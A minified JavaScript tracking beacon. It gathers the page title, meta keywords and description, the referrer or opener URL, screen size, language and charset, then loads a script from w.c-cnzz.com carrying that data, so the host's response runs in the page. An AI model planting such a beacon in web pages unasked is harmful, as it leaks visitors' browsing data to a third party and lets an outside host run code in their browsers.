(function(c){function l(b){var a,d,c,e,f,g;c=b.length;d=0;for(a="";d<c;){e=b.charCodeAt(d++)&255;if(d==c){a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(e>>2);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt((e&3)<<4);a+="==";break}f=b.charCodeAt(d++);if(d==c){a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(e>>2);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt((e&3)<<4|(f&240)>>4);a+=
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt((f&15)<<2);a+="=";break}g=b.charCodeAt(d++);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(e>>2);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt((e&3)<<4|(f&240)>>4);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt((f&15)<<2|(g&192)>>6);a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(g&63)}return a}function m(b){var a,
d,c,e;a="";c=b.length;for(d=0;d<c;d++)e=b.charCodeAt(d),1<=e&&127>=e?a+=b.charAt(d):(2047<e?(a+=String.fromCharCode(224|e>>12&15),a+=String.fromCharCode(128|e>>6&63)):a+=String.fromCharCode(192|e>>6&31),a+=String.fromCharCode(128|e>>0&63));return a}var f=[{key:"t",value:function(){var b="";try{b=c.title}catch(a){}return b.substring(0,100)}},{key:"k",value:function(){var b="";try{if(c.getElementsByTagName("meta"))for(var a in c.getElementsByTagName("meta")){var d=c.getElementsByTagName("meta")[a];
c.getElementsByTagName("meta").hasOwnProperty(a)&&d.getAttribute("name")&&"keywords"==d.getAttribute("name").toLowerCase()&&(b=d.getAttribute("content"))}}catch(f){}return b.substring(0,100)}},{key:"d",value:function(){var b="";try{if(c.getElementsByTagName("meta"))for(var a in c.getElementsByTagName("meta")){var d=c.getElementsByTagName("meta")[a];c.getElementsByTagName("meta").hasOwnProperty(a)&&d.getAttribute("name")&&"description"==d.getAttribute("name").toLowerCase()&&(b=d.getAttribute("content"))}}catch(f){}return b.substring(0,
100)}},{key:"r",value:function(){var b="";try{b=top.opener?top.opener.document.location.href:""}catch(a){}try{b=b||(top.document?top.document.referrer:"")}catch(a){}return b.substring(0,150)}},{key:"s",value:function(){return[screen.width,screen.height,screen.colorDepth||0].join("x")}},{key:"l",value:function(){return(navigator.language||navigator.browserLanguage||navigator.systemLanguage).replace(/[^a-zA-Z0-9\-]/g,"")}},{key:"c",value:function(){return c.characterSet||c.charset||""}}],g="http://w.c-cnzz.com/core.php?",
h=c.createElement("script");for(i in f)f.hasOwnProperty(i)&&(k=f[i].key,g+=k+"="+encodeURIComponent("t"==k||"k"==k||"d"==k?l(m(f[i].value())):f[i].value())+"&");h.src=g+"cid=30001100&_="+ +new Date;c.body.appendChild(h)})(document);